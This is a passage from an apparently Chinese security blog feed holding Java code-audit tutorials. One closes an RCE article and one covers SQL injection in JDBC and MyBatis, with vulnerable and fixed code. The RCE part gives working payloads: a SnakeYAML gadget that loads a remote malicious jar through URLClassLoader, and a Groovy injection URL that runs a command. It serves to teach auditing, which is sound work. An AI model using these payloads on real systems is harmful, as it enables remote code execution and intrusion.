&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>漏洞复现，先编译 <code>java</code> 再将恶意代码带入 <code>yaml-payload.jar</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924203259186.png" data-caption="image-20220924203259186"><img src="/../images/Java/rce/image-20220924203259186.png" alt="image-20220924203259186"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212111867.png" data-caption="image-20220924212111867"><img src="/../images/Java/rce/image-20220924212111867.png" alt="image-20220924212111867"></a></p><p>然后VPS <code>Python</code> 临时起一个服务放置 <code>yaml-payload.jar</code>（这里使用本机起服务）</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212749312.png" data-caption="image-20220924212749312"><img src="/../images/Java/rce/image-20220924212749312.png" alt="image-20220924212749312"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212459768.png" data-caption="image-20220924212459768"><img src="/../images/Java/rce/image-20220924212459768.png" alt="image-20220924212459768"></a></p><p>拼接如下内容：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p>访问后弹出记事本</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212609577.png" data-caption="image-20220924212609577"><img src="/../images/Java/rce/image-20220924212609577.png" alt="image-20220924212609577"></a></p><br/><h3 id="五、Groovy"><a href="#五、Groovy" class="headerlink" title="五、Groovy"></a>五、Groovy</h3><p><code>Groovy</code> 是一种基于Java平台的面向对象语言。 </p><p>漏洞分析，具体漏洞代码如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>主要原理，不安全的使用了 <code>Groovy</code> 调用命令，对用户的输入没有进行过滤。<code>content</code> 为用户输入的命令，groovy 接收指令后，利用 <code>evaluate</code> 进行执行。</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923105400989.png" data-caption="image-20220923105400989"><img src="/../images/Java/rce/image-20220923105400989.png" alt="image-20220923105400989"></a></p><p>漏洞复现，构造链接为：<code>http://127.0.0.1:8080/rce/groovy?content=&quot;calc&quot;.execute()</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924205355487.png" data-caption="image-20220924205355487"><img src="/../images/Java/rce/image-20220924205355487.png" alt="image-20220924205355487"></a></p><br/><h3 id="六、其他"><a href="#六、其他" class="headerlink" title="六、其他"></a>六、其他</h3><p>1）由于代码对于用户传入的类、类的方法、类的参数没有做任何限制，亦可以导致 RCE 的产生。<br>2）由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、JST+EL 等<br>3）由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf 等<br>4）由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic 等</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里只参考了 <code>Java-sec-code</code> 项目中的 <code>RCE</code> 漏洞进行学习，当然实战中的变化也不单单只有这些俗套的套路。后续会继续学习其他的挖掘方法、利用方法。</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/338055.html</span><br><span class="line">https://cbatl.gitee.io/2021/12/09/javaseccode1/</span><br><span class="line">https://www.cnpanda.net/codeaudit/705.html</span><br><span class="line">https://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</span><br><span class="line">https://www.cnblogs.com/CoLo/p/15240834.html#:~:text=ProcessBuilder%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%201%E3%80%81%E5%88%9B%E5%BB%BAProcessBuilder%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1,2%E3%80%81%E8%B0%83%E7%94%A8start%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%203%E3%80%81%E8%BF%94%E5%9B%9E%E7%9A%84Process%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8getInputStream%E8%8E%B7%E5%8F%96%E8%BE%93%E5%85%A5%E6%B5%81%204%E3%80%81%E8%AF%BB%E5%8F%96%E8%BE%93%E5%85%A5%E6%B5%81%E5%86%99%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计(一)-SQL注入</title>
      <link href="/2022/09/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/09/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="SQL-Injection-JDBC"><a href="#SQL-Injection-JDBC" class="headerlink" title="SQL Injection - JDBC"></a>SQL Injection - JDBC</h2><p>SQLI(SQL Injection)， SQL注入是因为程序未能正确对用户的输入进行检查，将用户的输入以拼接的方式带入SQL语句，导致了SQL注入的产生。攻击者可通过SQL注入直接获取数据库信息，造成信息泄漏。JDBC有两个方法执行SQL语句，分别是PrepareStatement和Statement。</p><br/><h3 id="一、PrepareStatement和Statement的区别"><a href="#一、PrepareStatement和Statement的区别" class="headerlink" title="一、PrepareStatement和Statement的区别"></a>一、PrepareStatement和Statement的区别</h3><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre># 当使用Statement对象时，每次执行一个SQL命令时，都会对它进行解析和编译。# 当使用PreparedStatement对象时，无论多少次地使用同一个SQL命令，都只会解析和编译一次。</pre></td></tr></tbody></table></figure><br/><h3 id="二、简单漏洞例子"><a href="#二、简单漏洞例子" class="headerlink" title="二、简单漏洞例子"></a>二、简单漏洞例子</h3><p>1、漏洞代码 - 语句拼接(Statement)，没有对语句进行过滤直接拼接</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 采用原始的Statement拼接语句，导致漏洞产生</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">jdbcVul</span><span class="params">(String id)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">        <span class="comment">// 拼接语句产生SQL注入</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &#x27;&quot;</span> + id + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_pass</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;查询结果 %s: %s&quot;</span>, res_name, res_pass);</span><br><span class="line">            result.append(info);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div><p>安全代码 - 过滤方法</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 采用黑名单过滤危险字符，同时也容易误伤（次方案）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSql</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">black</span> <span class="operator">=</span> <span class="string">&quot;&#x27;|;|--|+|,|%|=|*|(|)|like|xor|and|or|exec|insert|select|delete|update|count|drop|chr|mid|master|truncate|char|declare｜sleep|abs|rand|union&quot;</span>;</span><br><span class="line">    String[] black_list = black.split(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span> ; i &lt; black_list.length ; i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> (content.contains(black_list[i]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><br/>2、漏洞代码 - 语句拼接(PrepareStatement)<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PrepareStatement会对SQL语句进行预编译，但有时开发者为了便利，直接采取拼接的方式构造SQL，此时进行预编译也无用。</span></span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &quot;</span> + id;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">System.out.println(<span class="string">&quot;[*] 执行SQL语句：&quot;</span> + st);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br></pre></td></tr></table></figure></div><p>安全代码 - 预编译</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确的使用PrepareStatement可以有效避免SQL注入，使用？作为占位符，进行参数化查询</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对sql语句进行赋值，其中第一个参数是参数的位置，即第几个参数，第二个参数是传给该位置的值</span></span><br><span class="line">st.setString(<span class="number">1</span>, id);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br></pre></td></tr></table></figure></div><br/><p>3、安全代码 - ESAPI安全框架</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ESAPI (OWASP企业安全应用程序接口)是一个免费、开源的、网页应用程序安全控件库，它使程序员能够更容易写出更低风险的程序</span></span><br><span class="line"></span><br><span class="line">Codec&lt;Character&gt; oracleCodec = <span class="keyword">new</span> <span class="title class_">OracleCodec</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &#x27;&quot;</span> + ESAPI.encoder().encodeForSQL(oracleCodec, id) + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);                    </span><br></pre></td></tr></table></figure></div><br/><h3 id="三、漏洞类型"><a href="#三、漏洞类型" class="headerlink" title="三、漏洞类型"></a>三、漏洞类型</h3><br/>POST型注入<div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from users where username = &#x27;&quot;<span class="operator">+</span>username<span class="operator">+</span>&quot;&#x27; and password = &#x27;&quot;<span class="operator">+</span>password<span class="operator">+</span>&quot;&#x27; &quot;;</span><br></pre></td></tr></table></figure></div><br/>Like型注入<div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String name <span class="operator">=</span> req.getParameter(&quot;name&quot;);</span><br><span class="line">           String <span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from users where name like &#x27;%&#x27;+name+&#x27;%&#x27;&quot;;</span><br></pre></td></tr></table></figure></div><br/>Header注入<div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String referer <span class="operator">=</span> req.getHeader(&quot;referer&quot;);</span><br><span class="line">String <span class="keyword">sql</span> <span class="operator">=</span> &quot;update user set referer =&#x27;&quot;<span class="operator">+</span>referer<span class="operator">+</span>&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure></div><br/><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p>代码审计时，若发现存在使用JDBC连接数据库可进一步跟踪其代码，在没有使用预编译的情况下且未定义过滤方法，则可能存在SQL注入。</p><hr><h2 id="SQL-Injection-MyBatis框架"><a href="#SQL-Injection-MyBatis框架" class="headerlink" title="SQL Injection - MyBatis框架"></a>SQL Injection - MyBatis框架</h2><p>Mybatis 是一个基于 Java 的持久层框架，它内部封装了 jdbc，开发者只需要关注 sql 语句本身，不需要花费时间和精力去处理加载驱动、创建连接、创建 statement 等繁杂的过程。MyBatis 框架底层已经实现了对 SQL 注入的防御，但存在使用不当的情况下，仍然存在 SQL 注入的风险。</p><br/><h3 id="一、Mybatis特性"><a href="#一、Mybatis特性" class="headerlink" title="一、Mybatis特性"></a>一、Mybatis特性</h3><p>Mybatis 获取值有两种方法，<code>$&#123;&#125;</code> 和 <code>#&#123;&#125;</code>，一般情况下 Mybatis 使用 #{} 获取值，因为能避免 SQL 注入漏洞的产生，若直接使用 ${} 获取值则不能有效的避免注入。</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>#{} 解析的是占位符问号，可以防止SQL注入，使用了预编译。${} 直接获取值</pre></td></tr></tbody></table></figure><br/><h3 id="二、漏洞类型"><a href="#二、漏洞类型" class="headerlink" title="二、漏洞类型"></a>二、漏洞类型</h3><h5 id="1、like注入"><a href="#1、like注入" class="headerlink" title="1、like注入"></a><code>1、like注入</code></h5><p>以下语句在运行时会报错</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">&#x27;%#&#123;title&#125;%&#x27;</span></span><br></pre></td></tr></table></figure></div><p>该语句能正常运行，但由于使用了${}获取值，产生了SLQ语句拼接，即使使用了预编译，但若没有对语句进行过滤也会产生SQL注入漏洞</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;%$&#123;name&#125;%&#x27;</span></span><br></pre></td></tr></table></figure></div><p>正确语句</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name <span class="keyword">like</span> #&#123;name&#125;</span><br></pre></td></tr></table></figure></div><br/><h5 id="2、in后的参数注入"><a href="#2、in后的参数注入" class="headerlink" title="2、in后的参数注入"></a><code>2、in后的参数注入</code></h5><p>以下语句在运行时会报错</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="keyword">in</span> (#&#123;id&#125;)</span><br></pre></td></tr></table></figure></div><p>该语句则能正常运行，但由于使用了${}获取值，产生了SLQ语句拼接，即使使用了预编译，但没有对语句进行过滤则也会产生SQL注入漏洞</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="keyword">in</span> ($&#123;id&#125;)</span><br></pre></td></tr></table></figure></div><p>正确语句，使用forrach</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>foreach collection<span class="operator">=</span>&quot;ids&quot; item<span class="operator">=</span>&quot;item&quot; <span class="keyword">open</span><span class="operator">=</span>&quot;(&quot;separatosr<span class="operator">=</span>&quot;,&quot; <span class="keyword">close</span><span class="operator">=</span>&quot;)&quot;<span class="operator">&gt;</span></span><br><span class="line">#&#123;ids&#125;</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>foreach<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div><br><h5 id="3、order-by-注入"><a href="#3、order-by-注入" class="headerlink" title="3、order by 注入"></a><code>3、order by 注入</code></h5><p>以下语句在运行时会报错</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="operator">=</span><span class="string">&#x27;新闻&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> #&#123;<span class="type">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure></div><p>该语句则能正常运行，但由于使用了${}获取值，产生了SLQ语句拼接，即使使用了预编译，但没有对语句进行过滤则也会产生SQL注入漏洞</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="operator">=</span><span class="string">&#x27;新闻&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> $&#123;<span class="type">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure></div><p>正确语句</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="operator">=</span><span class="string">&#x27;新闻&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> #&#123;<span class="type">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure></div><br/><h3 id="三、靶场学习"><a href="#三、靶场学习" class="headerlink" title="三、靶场学习"></a>三、靶场学习</h3><h5 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a><code>1、环境搭建</code></h5><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] IDEA     2021.1</span><br><span class="line">[+] Mysql    5.7.26 </span><br><span class="line">[+] Tomcat   7</span><br><span class="line">[+] JDK      1.8_3_01 </span><br><span class="line">[+] CMS      inxedu_2.0.6</span><br></pre></td></tr></table></figure></div><br/><h5 id="2、IDEA搭建网站"><a href="#2、IDEA搭建网站" class="headerlink" title="2、IDEA搭建网站"></a><code>2、IDEA搭建网站</code></h5><p>● IDEA配置Maven,下载Maven，版本选择尽量不要最新</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://archive.apache.org/dist/maven/maven-3/</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915170827278.png" data-caption="image-20220915170827278"><img src="/../images/Java/sql/image-20220915170827278.png" alt="image-20220915170827278"></a></p><p>配置Maven环境变量，cmd打开：sysdm.cpl</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915171439247.png" data-caption="image-20220915171439247"><img src="/../images/Java/sql/image-20220915171439247.png" alt="image-20220915171439247"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915171322760.png" data-caption="image-20220915171322760"><img src="/../images/Java/sql/image-20220915171322760.png" alt="image-20220915171322760"></a></p><p>测试是否成功安装</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn -v</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915171631902.png" data-caption="image-20220915171322760"><img src="/../images/Java/sql/image-20220915171631902.png" alt="image-20220915171322760"></a></p><p>配置阿里镜像和jdk，在Maven解压的地方创建一个新文件夹<code>responsitory</code>，打开Maven文件夹下的conf中的settings.xml的<code>&lt;settings&gt;</code>标签内添加以下内容</p><p>配置jdk1.8</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span 